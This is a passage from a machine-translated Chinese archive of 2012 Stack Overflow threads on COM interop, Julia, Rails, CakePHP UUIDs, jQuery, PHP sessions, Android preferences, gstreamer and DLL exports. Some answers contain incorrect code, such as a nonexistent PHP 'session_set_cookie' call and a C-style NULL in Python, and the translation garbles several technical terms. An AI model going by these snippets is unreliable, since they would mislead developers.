                        [in, out] long* plDof, 
                        [in, out] long* plAsFoundAsLeft, 
                        [in, out] long* plOrigin, 
                        [in, out] long* pnLocation, 
                        [in, out] BSTR* pbstrDeviceSerialNum, 
                        [out] _SYSTEMTIME* pDate, 
                        [out, retval] VARIANT_BOOL* pResult);
        [helpstring("method SetPortNumber")]
        HRESULT _stdcall SetPortNumber(long nPort);
        [helpstring("method ClearConfigFatEntry")]
        HRESULT _stdcall ClearConfigFatEntry(
                        long nIndex, 
                        [out, retval] VARIANT_BOOL* pResult);
    };
}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:37:34.037

毫无疑问，您是通过导入 COM 服务器的类型库获得这些声明的。通过添加对 COM dll 的引用或手动运行 Tlbimp.exe。

是的，这是个问题，类型库只支持可以用 IDL 表达的子集。这些受歧视的工会当然不是其中的一部分。它们仅对于使结构正确编组跨越公寓边界很重要，只有代理/存根 DLL 需要正确查看它们，这是自动生成的代码。

解决问题的两种基本方法，都不是特别令人愉快：

*   您可以编辑从类型库生成的互操作库并修复结构声明。首先使用 ildasm.exe 反编译 DLL，编辑 IL 并将其与 ilasm.exe 重新组合在一起。您可以使用反编译的示例 C# 程序来查看 IL 应该是什么样子。这可行，但重要的是 COM 组件是稳定的，因此您不必一遍又一遍地执行此操作。MSDN 中有一篇[How-To 文章](http://msdn.microsoft.com/en-us/library/8zbc969t%28v=VS.85%29.aspx)描述了该过程。

*   用 C++/CLI 语言为组件编写一个包装器。您可以 #include 由来自 IDL 的 midl.exe 生成的 .h 文件。显然，只有当您有权访问 IDL 或拥有 .h 文件时，这才有效，如果您没有它，则需要联系供应商或作者。这样做的一个好处是您还可以规避其他类型的问题。一个缺点是您需要了解 C++ 语言和 COM 客户端编程的基础知识。

# julia - 关于 Windows 上 Julia 的几个基本问 题

> ID：12646494
> 
> 赞同：2
> 
> 时间：2012-09-28T19:51:47.370
> 
> 标签：julia

`julia.bat`我使用zip 存档中给出的文件在 Windows 上运行 Julia 。我有几个基本问​​题。这将启动一个 DOS 控制台。

*   输入`plot()`命令时，Julia 返回`plot not defined`. 如何使用该`plot()`功能？有可用的图形界面吗？

*   打字时`help`我得到：

![在此处输入图像描述](../Images/5081ff00734739edf828b741c8ec3132.png)

这是什么意思 ？

*   zip存档中也有该`launch-julia-webserver.bat`文件。运行此文件时，会打开两个 DOS 窗口，但没有其他任何反应。我们可以用这个文件做什么以及如何做？

顺便说一句，我没有找到任何文档来回答这些基本问题……当然，如果您知道在哪里可以找到这样的文档，那将是一个理想的答案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T18:54:42.317

要回答您的直接问题，`help`它是作为函数实现的，并且必须用括号调用函数。尝试`help()`，或获取标准库中特定函数的帮助，将其作为参数提供；即，`help(help)`。

当您输入不带括号的函数名称时，默认情况下打印所有实现及其参数类型。

主要的 Julia 文档可在[http://docs.julialang.org/](http://docs.julialang.org/)在线获得。[我们在https://groups.google.com/forum/#!forum/julia-dev](https://groups.google.com/forum/#!forum/julia-dev)也有一个邮件列表。

网络服务器相当粗糙，尤其是在 Windows 上。您应该能够在`http://localhost:2000/`它运行时打开并访问基于 Web 的命令环境。但是您可能只想坚持使用普通命令行。

另一位贡献者强调了`help`对新用户的潜在问题的响应，我们在[https://github.com/JuliaLang/julia/issues/1320](https://github.com/JuliaLang/julia/issues/1320)上打开了一个错误。这是一门新的语言，还有很多不完善的地方，所以感谢您帮助我们归档这些内容！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-03T17:03:45.947

要使用`launch-julia-webserver.bat`，在双击它并打开两个 DOS 窗口后，其中一个应显示“Connect to `http://localhost:2000/`for the web REPL”。如果您打开 Web 浏览器`http://localhost:2000/`，您应该会看到一个欢迎页面，询问您的姓名和会话名称。

# ruby-on-rails - 如何在 Rails 的 ERB 文件中检查开发或生产？

> ID：12646495
> 
> 赞同：19
> 
> 时间：2012-09-28T19:51:50.323
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2, development-environment, production-environment

如果在生产中，我想通过 Google CDN 加载 jQuery UI，如果在开发中，我想在本地加载。所以在我的 application.html.erb 布局中，我必须知道我是在生产中还是在开发中。有我可以检查的变量吗？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-09-28T19:59:16.007

扩展 Paritosh 的答案，`Rails.env.production?`并`Rails.env.development?`根据您使用的环境返回真/假。

这些方法在模块中的`StringInquirer`类中定义。[在这里](https://github.com/rails/rails/blob/master/activesupport/lib/active_support/string_inquirer.rb)`ActiveSupport`看到他们。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-28T20:01:09.227

要重复上一个答案，您可以将检查范围限定为特定环境，如下所示：

```
Rails.env.development? 
```

`development?`您要检查的环境的名称在哪里。

另外我倾向于做的其他事情是，如果我正在检查多个环境，您可能想要执行以下操作：

```
if %w(staging production).include?(Rails.env)
  # do something
end 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-28T19:54:09.227

使用`Rails.env`，它将为您提供正在处理的环境。

# php - CakePHP中使用UUID，推荐什么DataType？

> ID：12646498
> 
> 赞同：7
> 
> 时间：2012-09-28T19:51:57.630
> 
> 标签：php, mysql, oracle, cakephp-2.0, uuid

我的场景：

*   新的 Cake (2.x) 项目，还没有 DB
*   MySQL 集群，也许是 Oracle 集群产品
*   无需迁移/导入数据
*   数据可能如下所示：`Users`-> HABTM -> `Groups`-> HABTM ->`Other Groups`

我一直在做一些关于如何在 CakePHP 中使用 UUID 的研究，我发现了以下内容：

Cake 对 UUID 有本机支持，但它假设`CHAR(36)`：

[http://book.cakephp.org/2.0/en/getting-started/cakephp-conventions.html](http://book.cakephp.org/2.0/en/getting-started/cakephp-conventions.html)

这个[堆栈答案](https://stackoverflow.com/a/10918405)指出：

> 以我的卑微经验，将 UUID 作为 CHAR(36) 的成本高得离谱，并且在 1+ 百万、10+ 百万、100+ 百万行时变得愚蠢

此[博客文章](http://www.paulmarshall.us/blog/cakephp-and-uuids)声称`BINARY(36)`优于`CHAR(36)`：

> 尽管 CakePHP 不支持密钥类型为 BINARY(16) 的 16 字节十六进制编码的 UUID，但它确实支持 BINARY(36)，这仍然比使用 CHAR(36) 更好，后者可以通过排序来减慢速度。

...但是蛋糕文档没有这么说...

我的问题是，考虑到 CakePHP/MySQL（或 CakePHP/Oracle），CHAR(36) 是这里唯一合理的选择，还是有更好、更有效的方式将 UUID 与 CakePHP（或任何其他 PHP 框架）一起使用?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-30T04:18:07.733

您可能已经知道这一点，但是您可以为新记录生成一个 id `String::uuid()`，并`BINARY(36)`在您的表中拥有 - 我认为 cake 在 uuid 生成之后没有任何自动魔法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-04T15:09:04.207

如果给 CakePHP 一个模型，其 id 字段的 SQL 类型为 Binary(36)，那么每次创建新记录时，都会为 id 字段赋予一个新的 GUID 值。此行为自 1.3.15 版起就存在。

关于您的其他问题，由于 CHAR 涉及整理，我会选择二进制解决方案。

# jquery - Jquery根据条件追加类

> ID：12646500
> 
> 赞同：0
> 
> 时间：2012-09-28T19:52:09.887
> 
> 标签：jquery

如果我的 var <100，我想向 tr 元素添加一个 .less 类`number`这是我到目前为止所做的，但它没有按预期工作。任何帮助，将不胜感激。

HTML 代码：

```
<table> 
   <thead>
       <tr> 
           <th>RESULT</th>
       </tr> 
   </thead> 
   <tbody>
   </tbody> 
</table> 
```

查询代码：

```
$(document).ready(function(){
  var number = 80;
  if(number<100){
    $("tbody").append('<tr class="less">');
  }else{
    $("tbody").append('<tr>');
  }        
  $("tbody").append('<td>'+number+'</td>');
  $("tbody").append('</tr>');
}); 
```

代码：

```
tr.less {
  color:red;
} 
```

（[在codepen上查看](http://codepen.io/anon/pen/hkpvD)）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:55:14.780

您必须将您的附加`td`到新创建`tr`的，而不是`tbody`

```
$(document).ready(function(){
  var number = 80;
  if(number<100){
    $("tbody").append('<tr class="less" />');
  }else{
    $("tbody").append('<tr />');
  }        
  $("tbody tr").append('<td>'+number+'</td>');
}); 
```

[**演示**](http://jsfiddle.net/T9k6m/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:04:51.700

尝试这个：

```
$(document).ready(function(){
    $('<tr><td/></tr>').attr('class', number<100 ? 'less' : '').appendTo('tbody');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T19:59:04.983

```
$().ready(function() {
  var appendTr = function(threshold) {
    var tr = $('<tr/>').appendTo('tbody');
    if(threshold < 100) {
      tr.addClass('less');
    }
    $('<td/>').appendTo(tr).text('' + threshold);
    return tr;
  };
  var tr = appendTr(80);
}) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T19:59:59.410

您正在尝试将结束标签附加到错误的元素..尝试这种方法..

```
$(document).ready(function(){
  var number = 80;

  $("tbody").append('<tr><td>'+number+'</td></tr>');
   if(number<100){
       $("tbody").find('tr:last').addClass('less')
  }
});​ 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T19:57:07.493

它正确附加，但由于您没有任何`td`文本，因此您看不到它，使用开发人员工具，您会看到它

# ios - 从 iPhone 安全地发送帖子数据

> ID：12646502
> 
> 赞同：2
> 
> 时间：2012-09-28T19:52:16.767
> 
> 标签：ios, iphone, security, post, webserver

我有以下问题：我已经了解如何在 iPhone 应用程序和 WebServer（SSL、Https）之间创建安全登录。我的问题是在创建会话令牌后，我如何确保如果黑客拦截它，在随后的 POST 请求中我收到来自同一用户的数据？

我问这个是因为每次发出请求时我都必须发送会话令牌对吗？（能够识别用户）。

我想防止多件事：

*   会话劫持，有人会嗅探用户令牌并发送数据而不是他（比如高分或其他东西）
*   使用通常不会从我的应用程序发送的数据进行数据注入，例如 1.000.000.000 高分（可能的分数，但不容易达到）。

我一直在看：

*   你做了
*   用户代理（如果它不是来自我的应用程序的应用程序名称，那就不好了，黑客实际上不得不猜测我做了这个检查或以某种方式下载我的 php 文件对吗？）
*   该应用程序来自 AppStore。如果请求来自未经 Apple 批准的应用程序，那就不行了。我实际上不确定您是否可以对此进行测试。如果这可行，黑客将不得不实际提交一个 AppStore 并下载它以将错误数据插入我的数据库中，我希望没有人有时间这样做。
*   MAC 地址。不确定Apple是否允许。IP 不起作用，因为有效用户可能会更改 IP。

我所看到的 Cookie 可以很容易地追踪并查看其中的数据。

也许我在这里没有问正确的问题，所以实际上可能是我如何确保我收到的数据来自正确的用户和正确的应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:43:35.330

围绕您的 POST 请求使用 SSL 的目的是防止第三方在传输过程中进行拦截。如果黑客可以得到它，则意味着令牌在客户端（根设备）、服务器（不安全的应用程序日志记录/调试）上泄露，或者他们破坏了 SSL。（不太可能）

您可以通过捕获设备 UDID（Apple 不喜欢这样）或与源 IP 进行比较来执行一些高级检查，但是对于有问题的安全性改进来说，这将是一个很大的努力。

只要确保所有敏感的东西都在 SSL 中，你应该没问题。

# fortran - OpenMP 在子程序中没有线程

> ID：12646504
> 
> 赞同：2
> 
> 时间：2012-09-28T19:52:19.653
> 
> 标签：fortran, openmp

我正在用 Fortran 编写一个矩阵乘法子例程。我正在使用英特尔 Fortran 编译器。我写了一个简单的静态调度并行do-loop。不幸的是，它只在一个线程上运行。这是代码：

```
 SUBROUTINE MATMULT(A,B,C,L,M,N)
      REAL*8 A,B,C
      INTEGER NCORES, CHUNK, TID
      DIMENSION A(L,N),B(L,M),C(M,N)
      PARAMETER (NCORES=8)
      CHUNK=(L/(NCORES+1))+1
      TID=0
!$OMP PARALLELDO SHARED(A,B,C,L,M,N,CHUNK) PRIVATE(I,J,K,TID)
!$OMP+DEFAULT(NONE) SCHEDULE(STATIC,CHUNK)
      DO I=1,L
         TID = OMP_GET_THREAD_NUM()
         PRINT *, "THREAD ", TID, " ON I=", I
         DO K=1,N
            DO J=1,M
               A(I,K) = A(I,K) + B(I,J)*C(J,K)
            END DO
         END DO
      END DO
!$OMP END PARALLELDO
      RETURN
      END 
```

笔记：

*   调用例程的主程序中没有并行指令
*   数组 A,B,C 在主程序中被串行初始化。A 初始化为零
*   我在编译期间强制执行 Fortran 固定源格式

我已确认以下内容：

*   另一个示例程序适用于 8 个线程（因此没有硬件问题）
*   我使用了 -openmp 编译器参数
*   OMP_GET_NUM_PROCS() 和 OMP_GET_MAX_THREADS() 都返回 0
*   对于 I 上的每次迭代，TID 都是 0（不应该是这种情况）

我无法诊断我的错误。我很感激对此的任何投入。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T20:27:47.830

标识符 OMP_GET_THREAD_NUM 未明确声明。默认的隐式类型规则意味着它将是 real 类型。这与 OpenMP 规范中对该名称的函数的声明不一致。

添加`USE OMP_LIB`将解决该问题。此外，不使用隐式类型 ( `IMPLICIT NONE`) 可以避免这种情况以及许多类似的问题。

# c# - 排除包含子目录的目录？

> ID：12646507
> 
> 赞同：1
> 
> 时间：2012-09-28T19:52:29.893
> 
> 标签：c#, .net-4.0, linq-to-objects

我有以下代码：

```
var directories =  Directory.GetDirectories(
        environmentSettings.SourcePath, 
        "*",
        SearchOption.AllDirectories)
    .Where(dir => !environmentSettings.FolderExclusions
                                      .Contains(Path.GetFileName(dir))); 
```

我想在目标路径中创建一个目录，但排除列表中显示的目录除外。这有效，但前提是该目录直接位于根目录下并且不包含子目录。

例如，如果排除列表包含一个名为`Custom`的目录，根目录是`C:\App`，它将排除`C:\App\Custom`而不是在目标路径中创建它，但是一旦遇到类似的东西`C:\App\Custom\Sub`，它最终会在目标路径上创建它。

无法让它为文件工作：

//复制所有文件

```
var files = Directory.GetFiles(environmentSettings.SourcePath, "*", SearchOption.AllDirectories)
      .Select(file => new FileInfo(file))
      .Where(file => !environmentSettings.FolderExclusions
                                         .Contains(file.Name) && 
                     !environmentSettings.FolderExclusions
                                         .Contains(file.Directory.Name)); 
```

上面的问题，是我不知道如何判断文件是如何嵌套的，例如，如果它是 under `c:\App\Custom\thumbs.db`，我认为它可以正常工作，但如果它是 under `c:\App\Custom\sub1\sub2\thumbs.db`，它仍然会复制文件和自定义目录这是我不想要的。我基本上需要在下面获取目录`c:\App`，如果是`Custom`，那么我排除该文件。

```
var files = Directory.GetFiles(environmentSettings.SourcePath, "*", SearchOption.AllDirectories)
            .Select(file => new FileInfo(file))
            .Where(file => !environmentSettings.FolderExclusions.Contains(file.Directory.Name) && (file.Directory.Parent == null || !environmentSettings.FolderExclusions.Contains(file.Directory.Parent.Name))); 
```

当我运行以下代码循环遍历所有文件并将它们放在目标目录中时，我遇到了 Directory not found 异常：

```
//Copy all the files
foreach (var file in files)
{
File.Copy(file.Name, file.FullName.Replace(environmentSettings.SourcePath, environmentSettings.TargetPath));
} 
```

问题是源文件可能类似于\network\app1\one.mp3，而我的目标目录可能是c:\programdata\myapp。`one.mp3`它说从源复制文件时找不到。不知道如何处理。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:06:12.803

如果这仅适用于父文件夹和第一个子文件夹，请尝试此操作：

```
var directories =  Directory.GetDirectories(environmentSettings.SourcePath, "*", SearchOption.AllDirectories)
    .Select(dir => new DirectoryInfo(dir))
    .Where(dir=>!excludes.Contains(dir.Name) && (dir.Parent == null || !excludes.Contains(dir.Parent.Name))); 
```

要使用文件启用此功能，请尝试以下操作

```
var files = Directory.GetFiles(sourcePath, "*", SearchOption.AllDirectories)
    .Select(file => new FileInfo(file))
    .Where(file=>!excludes.Contains(file.Directory.Name) && (file.Directory.Parent == null || !excludes.Contains(file.Directory.Parent.Name))); 
```

# login - 用户注册后应该自动登录吗？

> ID：12646520
> 
> 赞同：9
> 
> 时间：2012-09-28T19:53:24.887
> 
> 标签：login, registration, autologin

注册后自动登录用户是否安全？

用户填写注册表，一些信息消息发送到他的邮箱，然后：

*   用户重定向到登录页面，要求他提供凭据；

**或者**

*   用户自动登录为他新创建的用户？

我觉得自动登录不够安全，但想不通！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T20:00:11.360

如果他们只是填写了登录信息并且您不担心确认电子邮件地址是合法的，那么直接登录应该没有问题。

但是，您向创建虚假帐户的人/机器人敞开心扉（至少那些没有合法电子邮件地址的人）。如果您对此感到担忧（不确定这是面向公众的应用程序或 Intranet 等），那么您至少应该通过发送带有 guid 或您可以追踪的某些标识符的链接来验证电子邮件地址。然后，您可以在他们确认后让他们登录。

您也可以将其绑定到他们的 StackExchange/Facebook/OpenID/etc 帐户，而不是让用户填写另一个表格并担心维护所有这些信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-28T19:57:20.733

他们应该需要登录。此外，确认电子邮件不应*包含*他们的密码。如果他们设法给您提供了错误的电子邮件地址，而您自动将他们登录，那么其他人现在可以访问他们的帐户。即使您让他们两次键入他们的电子邮件地址，这仍然成立。有时人们会连续两次犯同样的错误。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-28T19:59:27.173

如果用户在确认步骤中作为正确的用户已经有一个活动会话，则自动登录是安全的。如果您考虑一下，它实际上并不是“自动登录”，而只是让他们像以前一样登录。

1.  用户注册
2.  保持会话识别用户
3.  用户导航到确认页面（在电子邮件中链接）
4.  您激活帐户

在那段时间里，没有理由结束会议。您想要结束会话（或不首先创建会话）的唯一原因是您的权限未正确设置为允许某人登录/创建会话而不给予他们比未注册用户更高的权限。

现在，请确保不要仅仅因为此人导航到用户 X 的确认页面而自动将用户标识为 X。如果用户导航到此页面但尚未打开会话，请不要假设他知道密码。

# javascript - 如何检测正在使用的浏览器是否是最新的

> ID：12646522
> 
> 赞同：0
> 
> 时间：2012-09-28T19:53:39.247
> 
> 标签：javascript, browser-detection

我能够使用 javascript 检测浏览器及其版本。检查此链接 - [Quirksmode.org](http://www.quirksmode.org/js/detect.html)

有没有办法检查这个浏览器是否是最新的。那是在提交这个问题时，我有 FireFox 15、Chrome 22 等。换句话说，我需要检查浏览器是否有可用的更新。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:02:38.920

这样的事情其实不太合理。

您必须有办法始终了解每个浏览器的最新版本，并且由于不存在标准化的方法，您必须求助于浏览器供应商网站的屏幕抓取来找到它。如果您正在抓取的页面发生变化，您将不得不重写您的抓取工具。

最重要的是，您必须检查他们的操作系统上是否有更高版本的浏览器。如果他们在 XP 上使用 IE8，则无法升级。如果他们在使用旧铬的旧 ubuntu 上，则无法升级，等等。

处理这个问题的常用方法是正式支持一些浏览器的*最低*版本，如果他们没有使用受支持的浏览器或版本，可能会通知用户。

# php - 如果 Chrome 没有自动执行，当浏览器关闭时如何销毁或取消设置或类似 Chrome 中的 PHP 会话？

> ID：12646538
> 
> 赞同：2
> 
> 时间：2012-09-28T19:55:02.157
> 
> 标签：php, session, google-chrome

我正在为网站使用 PHP 会话，以便在用户首次登录网站时显示免责声明页面。在用户浏览会话之后，或者当他们关闭浏览器时，会话应该被自动销毁。它在除 Chrome 之外的所有浏览器中都能正常工作。经过一番研究，我发现[这](https://stackoverflow.com/questions/10617954/chrome-doesnt-delete-session-cookies)导致了[这个](http://code.google.com/p/chromium/issues/detail?id=128513)。如果确实是 Chrome 的错误，我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:08:51.510

如果浏览器关闭并且它们在没有过期时间的情况下发送，则假设会话 cookie 被删除。

您可以在第一次开始会话之前定义 session_cache_expire：

```
session_cache_expire(60); // expires after 60 mins 
```

然后做 session_start();...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:07:05.410

与其依赖浏览器取消 cookie，不如将其设置为相当快地过期，并通过在后续页面请求中更新 cookie 来保持会话“活动”。

```
<?php
session_set_cookie( 60*15 );
session_start(); 
```

此示例将 cookie 设置为在 15 分钟后过期（您可以设置不同的过期时间，具体取决于您希望用户发送页面请求的频率：或者，您可以将其设置为仅一两分钟，然后通过XHR 只是比这更频繁）。这不会让 Chrome 删除 cookie，但您至少知道它不会无限期地浮动。

# java - 访问跨活动的共享首选项

> ID：12646543
> 
> 赞同：10
> 
> 时间：2012-09-28T19:55:24.950
> 
> 标签：java, android, sharedpreferences

我在这个 .java 文件中有一个 SharedPreference；在底部，您可以看到我将值保存到 SharedPreferences GB_PREFERENCES_BENCH 和 GB_PREFERENCES_FLIES。如何在其他活动中使用这些值？请参阅第二个代码示例了解我想如何使用它。

```
package com.creativecoders.gymbuddy;

import com.creativecoders.gymbuddy.R;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.EditText;
import android.widget.TextView;

public class Benchmark extends Activity {

public static final String GB_PREFERENCES = "Prefs";

public static final String GB_PREFERENCES_BENCH = "Bench";
public static final String GB_PREFERENCES_FLIES = "Flies";

SharedPreferences gBValues;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_benchmark);

    gBValues = getSharedPreferences(GB_PREFERENCES, Context.MODE_PRIVATE);

}

public void onStart() {
    super.onStart();

    findViewById(R.id.button5).setOnClickListener(new handleButton5());

}

class handleButton5 implements OnClickListener {
    public void onClick(View v) {

        EditText editText1 = (EditText)findViewById(R.id.editText1);
        String sWeight = editText1.getText().toString();
        final double dWeight = Double.parseDouble(sWeight);

        EditText editText2 = (EditText)findViewById(R.id.editText2);
        String sPush = editText2.getText().toString();
        final double dPush = Double.parseDouble(sPush);

        EditText editText3 = (EditText)findViewById(R.id.editText3);
        String sSit = editText3.getText().toString();
        final double dSit = Double.parseDouble(sSit);

        EditText editText4 = (EditText)findViewById(R.id.editText4);
        String sPull = editText4.getText().toString();
        final double dPull = Double.parseDouble(sPull);

        double dBench = (((Math.floor(dWeight*.0664))*10)-10)+dPush;
        double dFlies = (Math.floor(((Math.floor(dBench*.6)/10)*10)));

        int iBench = (int)dBench;
        int iFlies = (int)dFlies;

        Editor editor1 = gBValues.edit();
        editor1.putInt(GB_PREFERENCES_BENCH, iBench);
        editor1.commit();

        Editor editor2 = gBValues.edit();
        editor2.putInt(GB_PREFERENCES_FLIES, iFlies);
        editor2.commit();

        }
    }

 } 
```

这是我想使用它的方式；（特别是在 on create 方法中将 TextView 的文本设置为 SharePreference 中的值）

```
package com.creativecoders.gymbuddy;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.TextView;

public class Upper100Start extends Activity {

public static final String GB_PREFERENCES = "Prefs";
public static final String GB_PREFERENCES_CURLS = "Curls";
SharedPreferences gBValues;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.upper100start);

    if (gBValues.contains(GB_PREFERENCES_CURLS)){
    TextView TextView2 = (TextView)findViewById(R.id.textView2);
    TextView2.setText(gBValues.getString(GB_PREFERENCES_CURLS, ""));
    }

}
public void onStart() {
    super.onStart();

    findViewById(R.id.button2).setOnClickListener(new handleButton2());
    findViewById(R.id.button3).setOnClickListener(new handleButton3());
}
class handleButton2 implements OnClickListener {
    public void onClick(View v) {
        Intent intent = new Intent(Upper100Start.this, Upper101.class);
        startActivity(intent);
        }
    }
class handleButton3 implements OnClickListener {
    public void onClick(View v) {
        Intent intent = new Intent(Upper100Start.this, Main.class);
        startActivity(intent);
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-09-28T20:29:34.713

共享首选项可在整个应用程序中访问，因此您可以从应用程序中的任何活动中读取它们。

在活动 A 中存储键/值对：

```
SharedPreferences settings = getSharedPreferences("mysettings", 
     Context.MODE_PRIVATE);

SharedPreferences.Editor editor = settings.edit();
editor.putString("mystring", "wahay");
editor.commit(); 
```

从另一个活动中读取此值：

```
SharedPreferences settings = getSharedPreferences("mysettings", 
    Context.MODE_PRIVATE);
String myString = settings.getString("mystring", "defaultvalue"); 
```

[您可以在http://developer.android.com/guide/topics/data/data-storage.html#pref](http://developer.android.com/guide/topics/data/data-storage.html#pref)找到更多信息

# php - 使用带有 ShareThis 社交分享插件的自定义 URL

> ID：12646544
> 
> 赞同：7
> 
> 时间：2012-09-28T19:55:27.010
> 
> 标签：php, javascript

我想知道如何将自定义 URL 与 ShareThis 社交分享插件一起使用。例如，我的 index.php 页面上有一个帖子摘要，它链接到 my-post.php，所以我想做的是让用户从我的索引页面共享 my-post.php。

这是来自 sharethis.com 的代码

纽扣：

```
<span class='st_facebook_hcount' displayText='Facebook'></span>
<span class='st_twitter_hcount' displayText='Tweet'></span>
<span class='st_googleplus_hcount' displayText='Google +'></span>
<span class='st_pinterest_hcount' displayText='Pinterest'></span> 
```

JS：

```
<script type="text/javascript" src="http://w.sharethis.com/button/buttons.js"></script>
<script type="text/javascript">stLight.options({publisher: "ur-448a73fe-e6c1-f7a5-f0a5-3912c860fc9e"});</script> 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-28T20:01:38.223

您可以将 st_url 属性附加到每个跨度标记，该标记将控制共享的 URL。

```
<span class='st_facebook_hcount' st_url='http://my.custom.com/url' displayText='Facebook'></span> 
```

来源： https: [//support.sharethis.com/hc/en-us/articles/218441477-How-to-Customize-which-URL-Text-and-IMG-to-Share](https://support.sharethis.com/hc/en-us/articles/218441477-How-to-Customize-which-URL-Text-and-IMG-to-Share)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-28T20:00:32.700

只需像这样使用 st_url 属性：

```
<span class="st_sharethis" st_url="http://www.yoursite.com/innerpage.php" st_title="inner page title" displayText="ShareThis"></span> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-07-18T14:21:51.403

您可以添加一个额外的属性，例如

```
<div class="sharethis-inline-share-buttons"  data-url="<!--YOUR_URL_GOES_HERE-->"></div> 
```

# gstreamer - gstreamer：无法添加元素

> ID：12646547
> 
> 赞同：1
> 
> 时间：2012-09-28T19:55:37.613
> 
> 标签：gstreamer, python-gstreamer

我正在尝试将视频从 android 手机流式传输到我的笔记本电脑。我运行了 gstreamer，它工作正常。我的问题是以下代码：

```
 [....]
    pipeline = gst.parse_launch('rtspsrc name=source latency=0 ! decodebin ! autovideosink')
    source = pipeline.get_by_name('source')
    source.props.location =  "rtsp://128.237.119.100:8086/"
    decoder = gst.element_factory_make("decodebin", "decoder")
    sink = gst.element_factory_make("autovideosink", "sink")

    pipeline.add(source, decoder, sink)
    gst.element_link_many(source, decoder, sink)
    [...] 
```

运行时出现此错误：

```
 (server.py:2893): GStreamer-WARNING **: Name 'source' is not unique in bin 'pipeline0', not adding
       Traceback (most recent call last):
       File "server.py", line 27, in <module>
       py = pyserver()
       File "server.py", line 18, in __init__
       pipeline.add(source, decoder, sink)
       gst.AddError: Could not add element 'source' 
```

我是 gstreamer 的新手。我已经参考了这个问题来编写代码：[Playing RTSP with python-gstreamer](https://stackoverflow.com/questions/4192871/playing-rtsp-with-python-gstreamer)

谁能指出我做错了什么？为什么我会收到 adderror？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T17:56:05.497

您不必再次将元素源添加到管道。它已经添加了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-17T08:14:31.537

来自 gstreamer **gst_pipeline_add_many()**文档：

> 将一个以 NULL 结尾的元素列表添加到 bin。

所以应该是：

```
gst.element_link_many(source, decoder, sink, NULL); 
```

# c# - 如何遍历exe的所有dll并查看是否导出了某个函数

> ID：12646549
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:55:38.887
> 
> 标签：c#

我有一个应用程序，它是一个游戏启动器。在应用程序运行时，我想遍历该文件中加载的 dll 并检查是否导出了某个函数。

我怎样才能做到这一点？

我不是在谈论使用网络反射器我想通过从游戏启动器加载到内存中的 dll 检查导出的函数，并循环遍历它们以查看是否调用了某个函数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:21:59.743

Jax，看看[这个 StackOverflow 问题](https://stackoverflow.com/questions/4606628/viewing-export-table-on-an-unmanaged-dll-in-c-sharp)。它应该能够完全满足您的需求。为简单起见，请特别查看说明使用的注释`Dumpbin.exe /exports`。这可能是最简单的方法。如果您绝对需要以编程方式执行此操作，请查看[此 Stackoverflow 问题](https://stackoverflow.com/questions/437432/is-there-a-way-to-find-all-the-functions-exposed-by-a-dll)。

使用 Dumpbin 方法，您可以执行以下操作：

```
 // The name of the DLL to output exports from
        const string dllName = @"C:\Windows\System32\Wdi.dll";
        string output = string.Empty;
        var info = new ProcessStartInfo();
        var process = new Process();

        info.CreateNoWindow = true;
        info.RedirectStandardOutput = true;
        info.UseShellExecute = false;
        info.EnvironmentVariables.Remove("Path");
        // DumpBin requires a path to IDE
        info.EnvironmentVariables.Add("Path", Environment.GetEnvironmentVariable("Path") + @";c:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\");

        // Your path might be different below.
        info.FileName = @"c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\bin\dumpbin.exe";

        info.Arguments = string.Format("/exports \"{0}\"", dllName);

        process.OutputDataReceived += (senderObject, args) => output = output + args.Data;
        process.StartInfo = info;
        process.Start();
        process.BeginOutputReadLine();

        process.WaitForExit();
        // output now contains the output 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:00:09.017

你可能想看看类似的东西

[在 C# 中使用反射在运行时加载未引用的程序集](http://www.codeproject.com/Articles/32828/Using-Reflection-to-load-unreferenced-assemblies-a)

[反射示例 [C#]](http://www.csharp-examples.net/reflection-examples/)

* * *

## 回答 #3

> 赞同：0
